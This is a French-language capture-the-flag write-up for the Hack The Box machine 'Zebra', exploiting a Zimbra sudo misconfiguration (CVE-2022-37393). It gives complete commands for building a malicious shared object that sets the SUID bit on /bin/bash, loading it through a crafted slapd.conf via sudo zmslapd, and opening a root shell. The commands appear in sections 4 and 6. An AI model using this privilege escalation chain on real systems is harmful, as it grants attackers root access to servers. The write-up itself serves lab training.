HTB Zebra — CVE-2022-37393 Write-up
Informations générales
Champ
Valeur
Machine
Zebra
OS
Linux
Difficulté
Very Easy
CVE
CVE-2022-37393
Technologie
Zimbra Collaboration Suite
Technique
SUDO Exploitation
Résumé
Zebra est une machine Linux très facile qui exploite une mauvaise configuration sudo dans Zimbra Collaboration Suite. L'utilisateur zimbra peut exécuter zmslapd en tant que root avec des paramètres arbitraires. En forgeant un fichier de configuration slapd.conf malveillant qui charge un .so custom, le constructor C s'exécute en root et pose le bit SUID sur /bin/bash.
1. Reconnaissance
nmap -p- 10.129.228.77
Port
État
Service
22/tcp
open
SSH
80/tcp
open
HTTP
8443/tcp
open
HTTPS-alt
Le port 80 expose un webshell HTB avec accès direct en tant qu'utilisateur zimbra.
2. Énumération sudo
sudo -l
(root) NOPASSWD: /opt/zimbra/libexec/zmslapd
(root) NOPASSWD: /opt/zimbra/common/sbin/postfix
...
zmslapd NOPASSWD avec paramètres arbitraires → vecteur CVE-2022-37393.
3. Mécanisme CVE-2022-37393
zmslapd (OpenLDAP de Zimbra) accepte via -f un fichier de config custom :
modulepath <dossier>
moduleload <nom_du_so>
Quand le .so est chargé, les fonctions __attribute__((constructor)) s'exécutent avant main(), en root.
4. Exploitation
Fix PATH pour gcc
export PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/$(ls /usr/lib/gcc/x86_64-linux-gnu/)
Compilation du .so malveillant
printf '#include <stdlib.h>\n__attribute__((constructor)) void init(){setuid(0);setgid(0);system("chmod +s /bin/bash");}\n' > /tmp/evil.c
gcc -shared -fPIC -nostartfiles -o /tmp/evil.so /tmp/evil.c
Création du slapd.conf malveillant
printf 'modulepath /tmp\nmoduleload evil\n' > /tmp/slapd.conf
Déclenchement du privesc
sudo /opt/zimbra/libexec/zmslapd -u root -g root -f /tmp/slapd.conf
ls -la /bin/bash
# -rwsr-sr-x 1 root root
5. Shell root
/bin/bash -p -c 'id && cat /root/flag.txt'
# uid=997(zimbra) euid=0(root)
6. Commandes complètes
# Fix PATH
export PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/$(ls /usr/lib/gcc/x86_64-linux-gnu/)

# Build .so
printf '#include <stdlib.h>\n__attribute__((constructor)) void init(){setuid(0);setgid(0);system("chmod +s /bin/bash");}\n' > /tmp/evil.c
gcc -shared -fPIC -nostartfiles -o /tmp/evil.so /tmp/evil.c

# Config slapd
printf 'modulepath /tmp\nmoduleload evil\n' > /tmp/slapd.conf

# Privesc
sudo /opt/zimbra/libexec/zmslapd -u root -g root -f /tmp/slapd.conf

# Root
/bin/bash -p -c 'cat /root/flag.txt'
7. Points clés
• sudo -l = premier réflexe post-exploitation Linux
• NOPASSWD + paramètres arbitraires = privesc quasi garanti
• Constructor C s'exécute avant main() → idéal pour .so malveillant
• cc1 absent du PATH zimbra : find / -name cc1 2>/dev/null
• moduleload résout le nom sans .so depuis modulepath
8. Références
• CVE-2022-37393 — NVD
• AttackerKB
• Metasploit Module